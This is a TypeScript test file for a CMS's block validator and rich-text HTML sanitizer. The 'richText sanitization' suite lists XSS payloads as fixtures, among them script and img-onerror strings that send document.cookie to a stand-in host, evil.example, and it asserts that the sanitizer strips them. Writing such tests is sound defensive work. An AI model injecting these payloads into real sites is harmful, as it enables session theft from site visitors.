import { afterEach, describe, expect, it, vi } from "vitest";
import sanitizeHtmlLib from "sanitize-html";
import { normalizeFields, validateBlocks, type FieldNormalizers } from "./validate";
import { blocks, collections } from "./schema";
import type { PageBlock } from "~/types/content";

const toAssetUrl = (id: string) => `https://cms.example.com/assets/${id}`;

/**
 * The real sanitizer, configured exactly as app/lib/directus.server.ts configures
 * it. The XSS cases below assert on the OUTPUT of the shipped policy — a stub
 * sanitizer here would let a broken allowlist sail through the suite.
 */
const sanitizeHtml = (html: string) =>
  sanitizeHtmlLib(html, {
    allowedTags: [
      "h1", "h2", "h3", "h4", "h5", "h6",
      "p", "br", "hr", "blockquote", "pre", "code",
      "strong", "b", "em", "i", "u", "s", "sub", "sup",
      "ul", "ol", "li",
      "a", "img", "figure", "figcaption",
      "table", "thead", "tbody", "tfoot", "tr", "th", "td",
      "span", "div",
    ],
    allowedAttributes: {
      a: ["href", "title", "target", "rel"],
      img: ["src", "alt", "title", "width", "height", "loading"],
      th: ["colspan", "rowspan", "scope"],
      td: ["colspan", "rowspan"],
      "*": ["class"],
    },
    allowedSchemes: ["http", "https", "mailto", "tel"],
    transformTags: {
      a: sanitizeHtmlLib.simpleTransform("a", { rel: "noopener noreferrer" }, true),
    },
  });

const normalizers: FieldNormalizers = { toAssetUrl, sanitizeHtml };

function block(collection: string, item: Record<string, unknown>, id = "b1"): PageBlock {
  return { id, sort: 1, collection, item };
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe("validateBlocks", () => {
  it("keeps a valid block and replaces its item with the parsed data", () => {
    const input = block("block_cta", {
      title: "Ready?",
      cta_text: "Go",
      cta_link: "/contact",
      variant: "accent",
      description: null, // null strip → dropped, still parses
    });

    const result = validateBlocks([input], normalizers);

    expect(result).toHaveLength(1);
    expect(result[0].collection).toBe("block_cta");
    expect(result[0].item).toEqual({
      title: "Ready?",
      cta_text: "Go",
      cta_link: "/contact",
      variant: "accent",
    });
  });

  it("drops a block with an invalid enum value and warns exactly once", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const input = block("block_cta", {
      title: "Ready?",
      cta_text: "Go",
      cta_link: "/contact",
      variant: "purple", // not in ["default", "accent"]
    });

    const result = validateBlocks([input], normalizers);

    expect(result).toHaveLength(0);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(warn.mock.calls[0][0]).toContain("block_cta");
    expect(warn.mock.calls[0][0]).toContain("variant");
  });

  it("keeps an unknown collection as-is", () => {
    const input = block("block_pricing", { anything: "goes" });

    const result = validateBlocks([input], normalizers);

    expect(result).toHaveLength(1);
    expect(result[0]).toBe(input); // untouched, not re-parsed
  });

  it("strips nulls recursively — repeater items with null fields survive and parse", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const input = block("block_features", {
      title: "Features",
      subtitle: null,
      features: [
        { icon: null, title: "One", description: "First" },
        { icon: "★", title: "Two", description: "Second" },
      ],
    });

    const result = validateBlocks([input], normalizers);

    expect(warn).not.toHaveBeenCalled();
    expect(result).toHaveLength(1);
    const item = result[0].item as {
      subtitle?: string;
      features: { icon?: string; title: string }[];
    };
    expect(item.subtitle).toBeUndefined();
    expect(item.features).toHaveLength(2);
    expect(item.features[0]).toEqual({ title: "One", description: "First" });
    expect(item.features[1].icon).toBe("★");
  });

  it("rewrites bare-UUID asset fields to absolute URLs via the injected builder", () => {
    const uuid = "0193b7a2-1111-2222-3333-444455556666";
    const input = block("block_hero", { title: "Hero", image: uuid });

    const result = validateBlocks([input], normalizers);

    expect((result[0].item as { image?: string }).image).toBe(
      `https://cms.example.com/assets/${uuid}`,
    );
  });
});

/**
 * Every richText field is rendered with dangerouslySetInnerHTML via <Prose>, so
 * without sanitization a CMS editor who can save a block could store XSS on every
 * page that renders it. These cases are written against the threat — what an
 * attacker would actually paste into a WYSIWYG field — not against the
 * sanitizer's implementation.
 */
describe("richText sanitization", () => {
  // Every block whose schema carries a richText field, with whatever else that
  // block requires — an incomplete fixture would be DROPPED by Zod and the
  // sanitization assertions would never run.
  const richTextBlocks = [
    { collection: "block_content", required: {} },
    { collection: "block_image_text", required: { image: "https://example.com/i.jpg" } },
    { collection: "block_about", required: {} },
  ] as const;

  const attacks: { name: string; payload: string; mustNotContain: string[] }[] = [
    {
      name: "inline <script>",
      payload: '<p>Hello</p><script>fetch("https://evil.example?c="+document.cookie)</script>',
      mustNotContain: ["<script", "evil.example"],
    },
    {
      name: "img onerror handler",
      payload: '<img src=x onerror="fetch(\'https://evil.example?c=\'+document.cookie)">',
      mustNotContain: ["onerror", "evil.example"],
    },
    {
      name: "javascript: href",
      payload: '<a href="javascript:alert(document.domain)">click</a>',
      mustNotContain: ["javascript:"],
    },
    {
      name: "iframe injection",
      payload: '<iframe src="https://evil.example/phish"></iframe>',
      mustNotContain: ["<iframe", "evil.example"],
    },
    {
      name: "svg event handler",
      payload: '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></svg>',
      mustNotContain: ["onbegin", "<svg", "<animate"],
    },
    {
      name: "style-based data exfil",
      payload: '<style>body{background:url("https://evil.example/x")}</style><p>hi</p>',
      mustNotContain: ["<style", "evil.example"],
    },
    {
      name: "event handler on an allowed tag",
      payload: '<p onclick="alert(1)">text</p>',
      mustNotContain: ["onclick"],
    },
  ];

  for (const { collection, required } of richTextBlocks) {
    for (const { name, payload, mustNotContain } of attacks) {
      it(`${collection}: neutralizes ${name}`, () => {
        const result = validateBlocks(
          [block(collection, { ...required, content: payload })],
          normalizers,
        );

        // Guard the guard: if the fixture were dropped as invalid, the
        // assertions below would vacuously pass on an empty array.
        expect(result).toHaveLength(1);

        const html = (result[0].item as { content: string }).content.toLowerCase();
        for (const needle of mustNotContain) {
          expect(html).not.toContain(needle.toLowerCase());
        }
      });
    }
  }

  it("preserves legitimate editorial markup", () => {
    const content =
      "<h2>Heading</h2><p>Some <strong>bold</strong> and <em>italic</em> text.</p>" +
      "<ul><li>One</li><li>Two</li></ul>" +
      '<a href="https://example.com">a link</a>' +
      '<img src="https://example.com/pic.jpg" alt="a picture" />';

    const result = validateBlocks([block("block_content", { content })], normalizers);
    const html = (result[0].item as { content: string }).content;

    expect(html).toContain("<h2>Heading</h2>");
    expect(html).toContain("<strong>bold</strong>");
    expect(html).toContain("<li>One</li>");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('src="https://example.com/pic.jpg"');
    expect(html).toContain('alt="a picture"');
  });

  it("adds rel=noopener to links so target=_blank can't reach window.opener", () => {
    const content = '<a href="https://example.com" target="_blank">out</a>';

    const result = validateBlocks([block("block_content", { content })], normalizers);
    const html = (result[0].item as { content: string }).content;

    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("sanitizes the articles collection's content field too", () => {
    const article = normalizeFields(
      collections.articles,
      { content: "<p>ok</p><script>alert(1)</script>" },
      normalizers,
    );

    expect((article as { content: string }).content).toBe("<p>ok</p>");
  });

  it("leaves non-richText string fields byte-for-byte alone", () => {
    // block_hero.title is a plain string — React escapes it at render time, so
    // sanitizing it here would silently corrupt legitimate copy like "Tips & Tricks".
    const result = validateBlocks(
      [block("block_hero", { title: "Tips & Tricks <3" })],
      normalizers,
    );

    expect((result[0].item as { title: string }).title).toBe("Tips & Tricks <3");
  });
});

describe("normalizeFields", () => {
  const def = blocks.block_hero;

  it("leaves http:// and rooted / values untouched", () => {
    const http = normalizeFields(def, { image: "http://example.com/pic.jpg" }, normalizers);
    expect(http.image).toBe("http://example.com/pic.jpg");

    const rooted = normalizeFields(def, { image: "/images/pic.jpg" }, normalizers);
    expect(rooted.image).toBe("/images/pic.jpg");
  });

  it("does not touch non-asset fields even when they look like UUIDs", () => {
    const uuid = "0193b7a2-1111-2222-3333-444455556666";
    const out = normalizeFields(def, { title: uuid, cta_link: uuid, image: uuid }, normalizers);
    expect(out.title).toBe(uuid);
    expect(out.cta_link).toBe(uuid);
    expect(out.image).toBe(toAssetUrl(uuid)); // only the asset-flagged field
  });
});
